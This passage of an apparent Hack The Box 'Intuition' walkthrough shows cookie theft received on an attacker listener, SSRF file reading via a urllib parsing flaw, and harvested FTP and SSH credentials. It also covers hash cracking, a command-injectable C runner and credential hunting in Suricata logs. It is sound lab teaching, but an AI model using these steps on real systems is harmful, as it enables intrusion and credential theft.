+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 <span class="literal">-m</span> http.server <span class="number">80</span></span><br><span class="line">::ffff:<span class="number">10.10</span>.x.x - - [<span class="number">13</span>/<span class="type">Sep</span>/<span class="number">2024</span> <span class="number">18</span>:<span class="number">00</span>:<span class="number">48</span>] <span class="string">&quot;GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line">::ffff:<span class="number">10.10</span>.x.x - - [<span class="number">13</span>/<span class="type">Sep</span>/<span class="number">2024</span> <span class="number">18</span>:<span class="number">00</span>:<span class="number">53</span>] <span class="string">&quot;GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">158.184</span> - - [<span class="number">13</span>/<span class="type">Sep</span>/<span class="number">2024</span> <span class="number">18</span>:<span class="number">00</span>:<span class="number">54</span>] <span class="string">&quot;GET /?cookie=user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br></pre></td></tr></table></figure></div>
+
+<p>We can now insert the cookie and get our admin panel:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/dashboard4.png"
+                      alt="Admin panel"
+                ><figcaption>Admin panel</figcaption></figure></p>
+<p>We can now see that we have a PDF creation feature under <code>http://dashboard.comprezzor.htb/create_pdf_report</code>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/create-pdf.png"
+                      alt="PDF Creation"
+                ><figcaption>PDF Creation</figcaption></figure></p>
+<p>We try to listen on what’s actually going on:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/create-report2.png"
+                      alt="PDF Creation"
+                ><figcaption>PDF Creation</figcaption></figure></p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">4444</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.158.184</span>] <span class="number">34502</span></span><br><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Accept<span class="literal">-Encoding</span>: identity</span><br><span class="line">Host: <span class="number">10.10</span>.x.x:<span class="number">4444</span></span><br><span class="line">User<span class="literal">-Agent</span>: Python<span class="literal">-urllib</span>/<span class="number">3.11</span></span><br><span class="line">Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that it’s using the user-agent <code>Python-urllib/3.11</code> which is vulnerable to <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-24329" >CVE-2023–24329 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<p>The concept is that when a URL starts with a blank space, urllib.py parser has some issues. Any domain or protocol filtering method using a block list can be easily bypassed. We can then abuse and SSRF vulnerability, abuse protocols and gain file reading:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/CVE-2023%E2%80%9324329.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/CVE-2023%E2%80%9324329-2.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p>We can now successfully read files!</p>
+<p>Checking currently running commands on the system:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/cve3.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/cve4.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p>Let’s now observe the contents of <code>app.py</code>:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/cve5.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p>We can see we have an import for <code>import main_bp from blueprints.report.report</code><br>Let’s then try to check <code>/app/code/blueprints/report/report.py</code>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/cve6.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p>We also have another import for <code>blueprints.dashboard.dashboard</code>, let’s then check <code>/app/code/blueprints/dashboard/dashboard.py</code>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/cve7.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p>We can see that we have some ftp creds: <code>ftp.login(user=&#39;ftp_admin&#39;, passwd=&#39;u3jai8y71s2&#39;)</code></p>
+<p>Since we don’t have any ftp exposed, let’s try to abuse it from our SSRF:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/cve8.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p>We can see that we have some ssh key and some notes:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/cve9.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p>Let’s download them and take a look:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/cve10.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p>We can see that we can login using that passphrase.<br>We obtain the username as a comment:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/cve11.png"
+                      alt="CVE-2023–24329"
+                ><figcaption>CVE-2023–24329</figcaption></figure></p>
+<p>We can now login as <code>dev_acc</code> user:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kujen@LAPTOP-GEVGOPRU:~$ ssh dev_acc@comprezzor.htb -i id_rsa</span><br><span class="line">The authenticity of host <span class="string">&#x27;comprezzor.htb (10.129.158.184)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>comprezzor.htb<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>id_rsa<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">dev_acc@intuition:~$ id</span></span><br><span class="line"><span class="string">uid=1001(dev_acc) gid=1001(dev_acc) groups=1001(dev_acc)</span></span><br><span class="line"><span class="string">dev_acc@intuition:~$ cat user.txt</span></span><br><span class="line"><span class="string">7a2afb180e3318******************</span></span><br><span class="line"><span class="string">dev_acc@intuition:~$</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>Looking for some database files I stumble upon <code>users.db</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:~$ <span class="built_in">cd</span> /var/www/app/blueprints/auth/</span><br><span class="line">dev_acc@intuition:/var/www/app/blueprints/auth$ <span class="built_in">ls</span></span><br><span class="line">auth.py  auth_utils.py  __pycache__  users.db  users.sql</span><br><span class="line">dev_acc@intuition:/var/www/app/blueprints/auth$ sqlite3 users.db</span><br><span class="line">SQLite version 3.37.2 2022-01-06 13:25:41</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line"><span class="built_in">users</span></span><br><span class="line">sqlite&gt; <span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">1|admin|sha256$nypGJ02XBnkIQK71<span class="variable">$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606</span>|admin</span><br><span class="line">2|adam|sha256$Z7bcBO9P43gvdQWp<span class="variable">$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43</span>|webdev</span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can crack <code>adam</code>‘s hash using this hashcat command:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ hashcat -m 30120 hashes.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line">&lt;snip&gt;</span><br><span class="line">sha256$Z7bcBO9P43gvdQWp<span class="variable">$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43</span>:adam gray</span><br><span class="line">&lt;snip&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can now use those creds to connect to ftp service since we can see that it’s listening on the system:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:/var/www/app/blueprints/auth$ netstat -anot</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</span><br><span class="line">tcp        0      0 172.21.0.1:21           0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">&lt;snip&gt;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:/var/www/app/blueprints/auth$ ftp adam@localhost</span><br><span class="line">Connected to localhost.</span><br><span class="line">220 pyftpdlib 1.5.7 ready.</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">229 Entering extended passive mode (|||55545|).</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">drwxr-xr-x   3 root     1002         4096 Apr 10 08:21 backup</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> backup</span><br><span class="line">250 <span class="string">&quot;/backup&quot;</span> is the current directory.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">229 Entering extended passive mode (|||39199|).</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">drwxr-xr-x   2 root     1002         4096 Apr 10 08:21 runner1</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> runner1</span><br><span class="line">250 <span class="string">&quot;/backup/runner1&quot;</span> is the current directory.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">229 Entering extended passive mode (|||48699|).</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">-rwxr-xr-x   1 root     1002          318 Apr 06 00:25 run-tests.sh</span><br><span class="line">-rwxr-xr-x   1 root     1002        16744 Oct 19  2023 runner1</span><br><span class="line">-rw-r--r--   1 root     1002         3815 Oct 19  2023 runner1.c</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can now download all the files and check the source of runner1:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:~$ <span class="built_in">ls</span></span><br><span class="line">runner1  runner1.c  run-tests.sh  user.txt</span><br><span class="line">dev_acc@intuition:~$ <span class="built_in">cat</span> runner1.c</span><br><span class="line">// Version : 1</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;dirent.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;openssl/md5.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define INVENTORY_FILE &quot;/opt/playbooks/inventory.ini&quot;</span></span><br><span class="line"><span class="comment">#define PLAYBOOK_LOCATION &quot;/opt/playbooks/&quot;</span></span><br><span class="line"><span class="comment">#define ANSIBLE_PLAYBOOK_BIN &quot;/usr/bin/ansible-playbook&quot;</span></span><br><span class="line"><span class="comment">#define ANSIBLE_GALAXY_BIN &quot;/usr/bin/ansible-galaxy&quot;</span></span><br><span class="line"><span class="comment">#define AUTH_KEY_HASH &quot;0feda17076d793c2ef2870d7427ad4ed&quot;</span></span><br><span class="line"></span><br><span class="line">int check_auth(const char* auth_key) &#123;</span><br><span class="line">    unsigned char digest[MD5_DIGEST_LENGTH];</span><br><span class="line">    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);</span><br><span class="line"></span><br><span class="line">    char md5_str[<span class="number">33</span>];</span><br><span class="line">    for (int i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        sprintf(&amp;md5_str[i*<span class="number">2</span>], &quot;%<span class="number">02</span>x&quot;, (unsigned int)digest[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (strcmp(md5_str, AUTH_KEY_HASH) == <span class="number">0</span>) &#123;</span><br><span class="line">        return <span class="number">1</span>;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void listPlaybooks() &#123;</span><br><span class="line">    DIR *dir = opendir(PLAYBOOK_LOCATION);</span><br><span class="line">    if (dir == NULL) &#123;</span><br><span class="line">        perror(&quot;Failed to open the playbook directory&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct dirent *entry;</span><br><span class="line">    int playbookNumber = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    while ((entry = readdir(dir)) != NULL) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;d_type == DT_REG &amp;&amp; strstr(entry-&gt;d_name, <span class="string">&quot;.yml&quot;</span>) != NULL) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: %s\n&quot;</span>, playbookNumber, entry-&gt;d_name);</span><br><span class="line">            playbookNumber++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closedir(<span class="built_in">dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void runPlaybook(const char *playbookName) &#123;</span><br><span class="line">    char run_command[1024];</span><br><span class="line">    snprintf(run_command, sizeof(run_command), <span class="string">&quot;%s -i %s %s%s&quot;</span>, ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);</span><br><span class="line">    system(run_command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void installRole(const char *roleURL) &#123;</span><br><span class="line">    char install_command[1024];</span><br><span class="line">    snprintf(install_command, sizeof(install_command), <span class="string">&quot;%s install %s&quot;</span>, ANSIBLE_GALAXY_BIN, roleURL);</span><br><span class="line">    system(install_command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; 2) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;\n&quot;</span>, argv[0]);</span><br><span class="line">        <span class="built_in">return</span> 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int auth_required = 0;</span><br><span class="line">    char auth_key[128];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (int i = 2; i &lt; argc; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strcmp(argv[i], <span class="string">&quot;-a&quot;</span>) == 0) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + 1 &lt; argc) &#123;</span><br><span class="line">                strncpy(auth_key, argv[i + 1], sizeof(auth_key));</span><br><span class="line">                auth_required = 1;</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Error: -a option requires an auth key.\n&quot;</span>);</span><br><span class="line">                <span class="built_in">return</span> 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!check_auth(auth_key)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: Authentication failed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strcmp(argv[1], <span class="string">&quot;list&quot;</span>) == 0) &#123;</span><br><span class="line">        listPlaybooks();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strcmp(argv[1], <span class="string">&quot;run&quot;</span>) == 0) &#123;</span><br><span class="line">        int playbookNumber = atoi(argv[2]);</span><br><span class="line">        <span class="keyword">if</span> (playbookNumber &gt; 0) &#123;</span><br><span class="line">            DIR *<span class="built_in">dir</span> = opendir(PLAYBOOK_LOCATION);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">dir</span> == NULL) &#123;</span><br><span class="line">                perror(<span class="string">&quot;Failed to open the playbook directory&quot;</span>);</span><br><span class="line">                <span class="built_in">return</span> 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            struct dirent *entry;</span><br><span class="line">            int currentPlaybookNumber = 1;</span><br><span class="line">            char *playbookName = NULL;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((entry = readdir(dir)) != NULL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (entry-&gt;d_type == DT_REG &amp;&amp; strstr(entry-&gt;d_name, <span class="string">&quot;.yml&quot;</span>) != NULL) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (currentPlaybookNumber == playbookNumber) &#123;</span><br><span class="line">                        playbookName = entry-&gt;d_name;</span><br><span class="line">                        <span class="built_in">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    currentPlaybookNumber++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            closedir(<span class="built_in">dir</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (playbookName != NULL) &#123;</span><br><span class="line">                runPlaybook(playbookName);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Invalid playbook number.\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Invalid playbook number.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strcmp(argv[1], <span class="string">&quot;install&quot;</span>) == 0) &#123;</span><br><span class="line">        installRole(argv[2]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage2: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;\n&quot;</span>, argv[0]);</span><br><span class="line">        <span class="built_in">return</span> 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dev_acc@intuition:~$ <span class="built_in">cat</span> run-tests.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># List playbooks</span></span><br><span class="line">./runner1 list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run playbooks [Need authentication]</span></span><br><span class="line"><span class="comment"># ./runner run [playbook number] -a [auth code]</span></span><br><span class="line"><span class="comment">#./runner1 run 1 -a &quot;UHI75GHI****&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install roles [Need authentication]</span></span><br><span class="line"><span class="comment"># ./runner install [role url] -a [auth code]</span></span><br><span class="line"><span class="comment">#./runner1 install http://role.host.tld/role.tar -a &quot;UHI75GHI****&quot;</span></span><br><span class="line">dev_acc@intuition:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>Doing some further enumeration for root owned readable files, I stumbled upon the <code>/var/log/suricata</code> folder where I could get creds for the user <code>lopez</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:/var/log/suricata$ zgrep -i lopez ./*.gz</span><br><span class="line">./eve.json.8.gz:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2023-09-28T17:43:36.099184+0000&quot;</span>,<span class="string">&quot;flow_id&quot;</span>:1988487100549589,<span class="string">&quot;in_iface&quot;</span>:<span class="string">&quot;ens33&quot;</span>,<span class="string">&quot;event_type&quot;</span>:<span class="string">&quot;ftp&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;192.168.227.229&quot;</span>,<span class="string">&quot;src_port&quot;</span>:37522,<span class="string">&quot;dest_ip&quot;</span>:<span class="string">&quot;192.168.227.13&quot;</span>,<span class="string">&quot;dest_port&quot;</span>:21,<span class="string">&quot;proto&quot;</span>:<span class="string">&quot;TCP&quot;</span>,<span class="string">&quot;tx_id&quot;</span>:1,<span class="string">&quot;community_id&quot;</span>:<span 